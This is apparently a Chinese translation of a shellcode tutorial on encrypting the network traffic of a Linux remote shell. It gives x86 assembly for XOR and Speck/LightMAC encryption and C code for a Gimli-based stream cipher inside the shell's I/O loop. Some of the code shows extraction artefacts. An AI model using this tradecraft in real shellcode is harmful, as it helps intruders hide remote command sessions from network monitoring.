## 前言

 **在这篇文章中，我们将简单介绍如何在通过TCP通信的位置无关代码（PIC）中实现数据加密。**

我将以Linux下的同步Shell作为演示样例，因此我建议大家在阅读本文之前先阅读下面这几篇关于Shellcode的细节文章。

> [Shellcode: Linuxx86同步Shell汇编](https://modexp.wordpress.com/2018/06/21/sync-> shell-nix/)
>
> [Shellcode:Linux
> AMD64同步Shell汇编](https://modexp.wordpress.com/2018/07/08/synch-shell-nix-> amd64/)
>
> [Shellcode:Linux ARM同步Shell汇编](https://modexp.wordpress.com/2018/08/13/sync-> shell-nix-arm32/)

可能还需要查看关于加密算法的内容：[Shellcode：ARM汇编中的加密算法介绍](https://modexp.wordpress.com/2018/02/04/arm-crypto/)。

## 协议和代码库

当我们在思考加密协议时，第一个想到的很可能是安全传输层协议（[TLS](https://datatracker.ietf.org/wg/tls/documents/)），因为它是针对Web安全的工业级标准。有的人可能还会想到[SSH](https://www.ssh.com/ssh/protocol/)或[IPSec](https://en.wikipedia.org/wiki/IPsec)等等，但是考虑到这些协议所采用的底层算法，它们其实都不适用于资源受限环境。而类似SHA-2和分组密码（例如Blowfish）这样加密哈希函数也并不是为类似RFID芯片这样的占用资源较少的电子设备设计的。

在2018年4月份，NIST曾为物联网行业的轻量级加密算法推行过一个[标准化进程](https://csrc.nist.gov/Projects/Lightweight-Cryptography)，整个过程需要好几年的时间才可以完成，但毫无疑问的是，整个行业并不会一直等待，因为这样会导致不安全的产品暴露在互联网中。某些密码学家选择采取主动的方式，通过自己的努力将他们设计的协议采用到这些低资源消耗的设备上，其中有两个典型的算法就是[BLINKER](https://eprint.iacr.org/2013/772)和[STROBE](https://strobe.sourceforge.io/)，而相应的适用于资源受限环境的代码库有[LibHydrogen](https://github.com/jedisct1/libhydrogen)和[MonoCypher](https://github.com/LoupVaillant/Monocypher)。

## 分组密码

分组密码有很多种，但[AES 128](https://tinycrypt.wordpress.com/2018/03/16/aes-tiny/)可能是目前最适合对在线流量进行加密的算法了，下面给出的是我们对不同种类分组密码的测试结果：

![测试结果](https://image.3001.net/images/20180826/1535259283_5b82329303ad5.png!small)

虽然这些加密算法都非常优秀，但是他们仍需要类似计数器（CTR）和基于认证的加密模块，其中最适合消息认证码（MAC）的加密算法就是LightMAC了，因为它在实现加密的过程中使用的是相同的分组密码。

## 流密码

另外两种针对认证加密的热门算法（AES-GCM的替换）就是ChaCha20和Poly1305了，但是ChaCha20采用的是200字节，而Poly1305为330字节。虽然跟HMAC-SHA2相比，Poly1305已经压缩得非常小了，但仍然占用资源过多。

## 置换函数

如果你花了很多时间去测试各种加密算法的话，你最终会发现在构造流密码、分组密码、加密认证模型、加密哈希函数和随机数生成器时，你需要的仅仅只是一个置换函数。下面这个表格给出的是我们针对三种函数的测试结果：

![测试结果](https://image.3001.net/images/20180826/1535259298_5b8232a2c1579.png!small)

这里我们选择使用Gimli，因为它占用资源最少，并且可以用来构造针对通信流量的加密算法。

## 异或密码

接下来，我们实现一个针对数据流的简单异或操作（Just For
Fun！）。下面的截图中显示的是一台Windows虚拟机发送给Linux虚拟机的部分命令，其中Linux平台运行的Shellcode是没有采用任何加密的。

![没有采用任何加密](https://image.3001.net/images/20180826/1535259306_5b8232aa4cdd6.png!small)

捕捉到两台主机间的通信数据之后，我们可以看到如下所示的TCP流数据：

![TCP流数据](https://image.3001.net/images/20180826/1535259314_5b8232b2c3882.png!small)

给Shellcode x86汇编代码中添加部分命令后，我们就可以进行8位异或运算了：

    
    
    ;
    
          ; read(r, buf, BUFSIZ, 0);
    
          xor   esi, esi          ; esi = 0
    
          mov   ecx, edi          ; ecx = buf
    
          cdq                      ; edx = 0
    
          mov   dl, BUFSIZ        ; edx = BUFSIZ
    
          push  SYS_read          ; eax = SYS_read
    
          pop   eax
    
          int   0x80
    
          
    
          ; encrypt/decrypt buffer
    
          pushad
    
          xchg  eax, ecx
    
    xor_loop:
    
          xor   byte[eax+ecx-1], XOR_KEY
    
          loop  xor_loop
    
          popad
    
          
    
          ; write(w, buf, len);
    
          xchg  eax, edx          ; edx = len
    
          mov   al, SYS_write
    
          pop   ebx               ; s or in[1]
    
          int   0x80
    
          jmp   poll_wait

通过在新的会话中执行相同的命令，通信数据将无法直接可读，我这里使用了haxdump来查看发送的命令以及接收到的结果：

![接收到的结果](https://image.3001.net/images/20180826/1535259337_5b8232c92e901.png!small)

当然了，长度为8位的密钥是无法有效阻止攻击者恢复出通信明文的，下图给出的是Cyberchef爆破密钥的过程：

![Cyberchef爆破密钥的过程](https://image.3001.net/images/20180826/1535259344_5b8232d0d6eba.png!small)

## Speck和LightMAC

一开始，我使用的是下面这段代码来对数据包的加密进行验证，它使用了Encrypt-then-MAC
(EtM)，而且这种方法比其他的方法要更安全，比如说MAC-then-Encrypt (MtE) 或Encrypt-and-MAC(E&M)：

    
    
    bits32
    
    
    
    
        
    
    
    
    
    %defineSPECK_RNDS    27
    
    
    
    
    %defineN              8
    
    
    
    
    %defineK             16  
    
    
    
    
    ;*****************************************
    
    
    
    
    ;Light MAC parameters based on SPECK64-128
    
    
    
    
    ;
    
    
    
    
    ; N =64-bits
    
    
    
    
    ; K =128-bits
    
    
    
    
    ;
    
    
    
    
    %defineCOUNTER_LENGTH N/2  ; should be <= N/2
    
    
    
    
    %defineBLOCK_LENGTH   N  ; equal to N
    
    
    
    
    %defineTAG_LENGTH     N  ; >= 64-bits && <= N
    
    
    
    
    %defineBC_KEY_LENGTH  K  ; K
    
    
    
    
     
    
    
    
    
    %defineENCRYPT_BLK speck_encrypt
    
    
    
    
    %defineGET_MAC lightmac
    
    
    
    
    %defineLIGHTMAC_KEY_LENGTH BC_KEY_LENGTH*2 ; K*2
    
    
    
    
        
    
    
    
    
    %definek0 edi    
    
    
    
    
    %definek1 ebp    
    
    
    
    
    %definek2 ecx    
    
    
    
    
    %definek3 esi
    
    
    
    
     
    
    
    
    
    %definex0 ebx    
    
    
    
    
    %definex1 edx
    
    
    
    
     
    
    
    
    
    ; esi= IN data
    
    
    
    
    ; ebp= IN key
    
    
    
    
     
    
    
    
    
    speck_encrypt:   
    
    
    
    
          pushad
    
    
    
    
     
    
    
    
    
          push   esi            ; save M
    
    
    
    
          
    
    
    
    
          lodsd                  ; x0 = x->w[0]
    
    
    
    
          xchg   eax, x0
    
    
    
    
          lodsd                  ; x1 = x->w[1]
    
    
    
    
          xchg   eax, x1
    
    
    
    
     
    
    
    
    
          mov    esi, ebp       ; esi = key
    
    
    
    
          lodsd
    
    
    
    
          xchg   eax, k0        ; k0 = key[0] 
    
    
    
    
          lodsd
    
    
    
    
          xchg   eax, k1        ; k1 = key[1]
    
    
    
    
          lodsd
    
    
    
    
          xchg   eax, k2        ; k2 = key[2]
    
    
    
    
          lodsd 
    
    
    
    
          xchg   eax, k3        ; k3 = key[3]    
    
    
    
    
          xor    eax, eax       ; i = 0
    
    
    
    
    spk_el:
    
    
    
    
          ; x0 = (ROTR32(x0, 8) + x1) ^ k0;
    
    
    
    
          ror    x0, 8
    
    
    
    
          add    x0, x1
    
    
    
    
          xor    x0, k0
    
    
    
    
          ; x1 = ROTL32(x1, 3) ^ x0;
    
    
    
    
          rol    x1, 3
    
    
    
    
          xor    x1, x0
    
    
    
    
          ; k1 = (ROTR32(k1, 8) + k0) ^ i;
    
    
    
    
          ror    k1, 8
    
    
    
    
          add    k1, k0
    
    
    
    
          xor    k1, eax
    
    
    
    
          ; k0 = ROTL32(k0, 3) ^ k1;
    
    
    
    
          rol    k0, 3
    
    
    
    
          xor    k0, k1    
    
    
    
    
          xchg   k3, k2
    
    
    
    
          xchg   k3, k1
    
    
    
    
          ; i++
    
    
    
    
          inc    eax
    
    
    
    
          cmp    al, SPECK_RNDS    
    
    
    
    
          jnz    spk_el
    
    
    
    
          
    
    
    
    
          pop    edi    
    
    
    
    
          xchg   eax, x0        ; x->w[0] = x0
    
    
    
    
          stosd
    
    
    
    
          xchg   eax, x1        ; x->w[1] = x1
    
    
    
    
          stosd
    
    
    
    
          popad
    
    
    
    
          ret
    
    
    
    
     
    
    
    
    
    ; edx= IN len
    
    
    
    
    ; ebx= IN msg
    
    
    
    
    ; ebp= IN key
    
    
    
    
    ; edi= OUT tag      
    
    
    
    
    lightmac:
    
    
    
    
          pushad
    
    
    
    
          mov     ecx, edx
    
    
    
    
          xor     edx, edx
    
    
    
    
          add     ebp, BLOCK_LENGTH + BC_KEY_LENGTH     
    
    
    
    
          pushad                 ; allocate N-bytes for M
    
    
    
    
          ; zero initialize T
    
    
    
    
          mov    [edi+0], edx   ; t->w[0] = 0;
    
    
    
    
          mov    [edi+4], edx   ; t->w[1] = 0;
    
    
    
    
          ; while we have msg data
    
    
    
    
    lmx_l0:
    
    
    
    
          mov    esi, esp       ; esi = M
    
    
    
    
          jecxz  lmx_l2         ; exit loop ifmsglen == 0
    
    
    
    
    lmx_l1:
    
    
    
    
          ; add byte to M
    
    
    
    
          mov    al, [ebx]      ; al = *data++
    
    
    
    
          inc    ebx
    
    
    
    
          mov    [esi+edx+COUNTER_LENGTH], al          
    
    
    
    
          inc    edx            ; idx++
    
    
    
    
          ; M filled?
    
    
    
    
          cmp    dl, BLOCK_LENGTH - COUNTER_LENGTH
    
    
    
    
          ; --msglen
    
    
    
    
          loopne lmx_l1
    
    
    
    
          jne    lmx_l2
    
    
    
    
          ; add S counter in big endian format
    
    
    
    
          inc    dword[esp+_edx]; ctr++
    
    
    
    
          mov    eax, [esp+_edx]
    
    
    
    
          ; reset index
    
    
    
    
         cdq                    ; idx = 0
    
    
    
    
          bswap  eax            ; m.ctr =SWAP32(ctr)
    
    
    
    
          mov    [esi], eax
    
    
    
    
          ; encrypt M with E using K1
    
    
    
    
          call   ENCRYPT_BLK
    
    
    
    
          ; update T
    
    
    
    
          lodsd                  ; t->w[0] ^= m.w[0];
    
    
    
    
          xor    [edi+0], eax      
    
    
    
    
          lodsd                  ; t->w[1] ^= m.w[1];
    
    
    
    
          xor    [edi+4], eax         
    
    
    
    
          jmp    lmx_l0         ; keep going
    
    
    
    
    lmx_l2:
    
    
    
    
          ; add the end bit
    
    
    
    
          mov    byte[esi+edx+COUNTER_LENGTH], 0x80
    
    
    
    
          xchg   esi, edi       ; swap T and M
    
    
    
    
    lmx_l3:
    
    
    
    
          ; update T with any msg dataremaining    
    
    
    
    
          mov    al, [edi+edx+COUNTER_LENGTH]
    
    
    
    
          xor    [esi+edx], al
    
    
    
    
          dec    edx
    
    
    
    
          jns    lmx_l3
    
    
    
    
          ; advance key to K2
    
    
    
    
          add    ebp, BC_KEY_LENGTH
    
    
    
    
          ; encrypt T with E using K2
    
    
    
    
          call   ENCRYPT_BLK
    
    
    
    
          popad                  ; release memory for M
    
    
    
    
          popad                  ; restore registers
    
    
    
    
          ret
    
    
    
    
     
    
    
    
    
    ; IN:ebp = global memory, edi = msg, ecx = enc flag, edx = msglen 
    
    
    
    
    ;OUT: -1 or length of data encrypted/decrypted
    
    
    
    
    encrypt:
    
    
    
    
          push   -1
    
    
    
    
          pop    eax            ; set return valueto -1
    
    
    
    
          pushad
    
    
    
    
          lea    ebp, [ebp+@ctx] ; ebp crypto ctx
    
    
    
    
          mov    ebx, edi       ; ebx = msg      
    
    
    
    
          pushad                 ; allocate 8-bytes fortag+strm
    
    
    
    
          mov    edi, esp       ; edi = tag
    
    
    
    
          ; if (enc) {
    
    
    
    
          ;  verify tag + decrypt
    
    
    
    
          jecxz  enc_l0
    
    
    
    
          ; msglen -= TAG_LENGTH;
    
    
    
    
          sub    edx, TAG_LENGTH
    
    
    
    
          jle    enc_l5         ; return -1 if msglen <= 0
    
    
    
    
          mov    [esp+_edx], edx
    
    
    
    
          ; GET_MAC(ctx, msg, msglen, mac);
    
    
    
    
          call   GET_MAC
    
    
    
    
          ; memcmp(mac, &msg[msglen],TAG_LENGTH)
    
    
    
    
          lea    esi, [ebx+edx] ; esi = &msg[msglen] 
    
    
    
    
          cmpsd
    
    
    
    
          jnz    enc_l5         ; not equal? return-1
    
    
    
    
          cmpsd 
    
    
    
    
          jnz    enc_l5         ; ditto
    
    
    
    
          ; MACs are equal
    
    
    
    
          ; zero the MAC
    
    
    
    
          xor    eax, eax
    
    
    
    
          mov    [esi-4], eax
    
    
    
    
          mov    [esi-8], eax
    
    
    
    
    enc_l0:
    
    
    
    
          mov    edi, esp
    
    
    
    
          test   edx, edx       ; exit if (msglen== 0)
    
    
    
    
          jz     enc_lx
    
    
    
    
          ; memcpy (strm, ctx->e_ctr,BLOCK_LENGTH);
    
    
    
    
          mov    esi, [esp+_ebp]; esi = ctx->e_ctr
    
    
    
    
          push   edi
    
    
    
    
          movsd
    
    
    
    
          movsd
    
    
    
    
          mov    ebp, esi
    
    
    
    
          pop    esi      
    
    
    
    
          ; ENCRYPT_BLK(ctx->e_key, &strm);
    
    
    
    
          call   ENCRYPT_BLK
    
    
    
    
          mov    cl, BLOCK_LENGTH
    
    
    
    
          ; r=(len > BLOCK_LENGTH) ?BLOCK_LENGTH : len;
    
    
    
    
    enc_l2:
    
    
    
    
          lodsb                  ; al = *strm++
    
    
    
    
          xor    [ebx], al      ; *msg ^= al
    
    
    
    
          inc    ebx            ; msg++
    
    
    
    
          dec    edx
    
    
    
    
          loopnz enc_l2         ; while (!ZF&& --ecx)
    
    
    
    
          mov    cl, BLOCK_LENGTH      
    
    
    
    
    enc_l3:                      ; do {
    
    
    
    
          ; update counter
    
    
    
    
          mov    ebp, [esp+_ebp]
    
    
    
    
          inc    byte[ebp+ecx-1]    
    
    
    
    
          loopz  enc_l3         ; } while (ZF&& --ecx)
    
    
    
    
          jmp    enc_l0
    
    
    
    
    enc_lx:
    
    
    
    
          ; encrypting? add MAC of ciphertext
    
    
    
    
          dec    dword[esp+_ecx]
    
    
    
    
          mov    edx, [esp+_edx]
    
    
    
    
          jz     enc_l4
    
    
    
    
          mov    edi, ebx
    
    
    
    
          mov    ebx, [esp+_ebx]
    
    
    
    
          mov    ebp, [esp+_ebp]
    
    
    
    
          ; GET_MAC(ctx, buf, buflen, msg);
    
    
    
    
          call   GET_MAC
    
    
    
    
          ; msglen += TAG_LENGTH;
    
    
    
    
          add    edx, TAG_LENGTH
    
    
    
    
    enc_l4:
    
    
    
    
          ; return msglen;
    
    
    
    
          mov    [esp+32+_eax], edx            
    
    
    
    
    enc_l5:      
    
    
    
    
          popad
    
    
    
    
          popad
    
    
    
    
          ret
    
    
    

需要注意的是，这里还得用到一个协议，接收方在对数据有效性进行验证之前需要知道发送方到底发送了多少数据过来，因此加密长度需要首先发送，接下来才是加密数据。但是请等一下，这里明明应该是Shellcode，为什么现在搞得那么复杂呢？试一下RC4？不，请大家往下看！

## Gimli

为了使用Gimli来代替RC4，我编写了下面这段代码，这里的置换函数本质上就是Gimli：

    
    
    #defineR(v,n)(((v)>>(n))|((v)<<(32-(n))))
    
    #defineF(n)for(i=0;i<n;i++)
    
    #defineX(a,b)(t)=(s[a]),(s[a])=(s[b]),(s[b])=(t)
    
      
    
    voidpermute(void*p){
    
      uint32_t i,r,t,x,y,z,*s=p;
    
     
    
      for(r=24;r>0;--r){
    
        F(4)
    
          x=R(s[i],24),
    
          y=R(s[4+i],9),
    
          z=s[8+i],   
    
          s[8+i]=x^(z+z)^((y&z)*4),
    
          s[4+i]=y^x^((x|z)*2),
    
         s[i]=z^y^((x&y)*8);
    
        t=r&amp3    
    
        if(!t)
    
          X(0,1),X(2,3),
    
          *s^=0x9e377900|r;   
    
        if(t==2)X(0,2),X(1,3);
    
      }
    
    }
    
     
    
    typedefstruct _crypt_ctx {
    
        uint32_t idx;
    
        int     fdr, fdw;
    
        uint8_t s[48];
    
        uint8_t buf[BUFSIZ];
    
    }crypt_ctx;
    
      
    
    uint8_tgf_mul(uint8_t x) {
    
        return (x << 1) ^ ((x >> 7) *0x1b);
    
    }
    
     
    
    //initialize crypto context
    
    voidinit_crypt(crypt_ctx *c, int r, int w, void *key) {
    
        int i;
    
        
    
        c->fdr = r; c->fdw = w;
    
        
    
        for(i=0;i<48;i++) { 
    
          c->s[i] = ((uint8_t*)key)[i % 16] ^gf_mul(i);
    
        }
    
        permute(c->s);
    
        c->idx = 0;
    
    }
    
     
    
    //encrypt or decrypt buffer
    
    voidcrypt(crypt_ctx *c) {
    
        int i, len;
    
     
    
        // read from socket or stdout
    
        len = read(c->fdr, c->buf, BUFSIZ);
    
        
    
        // encrypt/decrypt
    
        for(i=0;i<len;i++) {
    
          if(c->idx >= 32) {
    
            permute(c->s);
    
            c->idx = 0;
    
          }
    
          c->buf[i] ^= c->s[c->idx++];
    
        }
    
        // write to socket or stdin
    
        write(c->fdw, c->buf, len);
    
    }

在Linux Shell中使用这段代码之前，我们需要声明两个单独的加密上下文来处理输入、输出和128位的静态密钥：

    
    
    //using a static 128-bit key
    
        crypt_ctx          *c, c1, c2;
    
        
    
        // echo -n top_secret_key | openssl md5-binary -out key.bin
    
        // xxd -i key.bin
    
        
    
        uint8_t key[] = {
    
          0x4f, 0xef, 0x5a, 0xcc, 0x15, 0x78, 0xf6,0x01, 
    
          0xee, 0xa1, 0x4e, 0x24, 0xf1, 0xac, 0xf9,0x49 };

在进入主输出循环之前，我们还需要对每一个上下文初始化文件读取和写入描述符，这样可以减少代码的行数：

    
    
    //
    
            // c1 is for reading from socket andwriting to stdin
    
            init_crypt(&c1, s, in[1], key);
    
            
    
            // c2 is for reading from stdout andwriting to socket
    
            init_crypt(&c2, out[0], s, key);
    
            
    
            // now loop until user exits or someother error
    
            for (;;) {
    
              r = epoll_wait(efd, &evts, 1,-1);
    
                      
    
              // error? bail out           
    
              if (r<=0) break;
    
             
    
              // not input? bail out
    
              if (!(evts.events & EPOLLIN))break;
    
     
    
              fd = evts.data.fd;
    
              
    
              c = (fd == s) ? &c1 : &ampc2 
    
              
    
              crypt(c);     
    
            }

## 总结

对shellcode进行恢复之后，将能够得到明文数据，因为我在这里加密所采用的是一个静态密钥，为了防止这种情况出现，大家可以尝试使用类似Diffie-Hellman这样的密钥交换协议来实现，这个就留给大家自己动手尝试啦！

 *** 参考来源：[securelist](https://modexp.wordpress.com/2018/08/17/shellcode-encrypting-traffic/)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

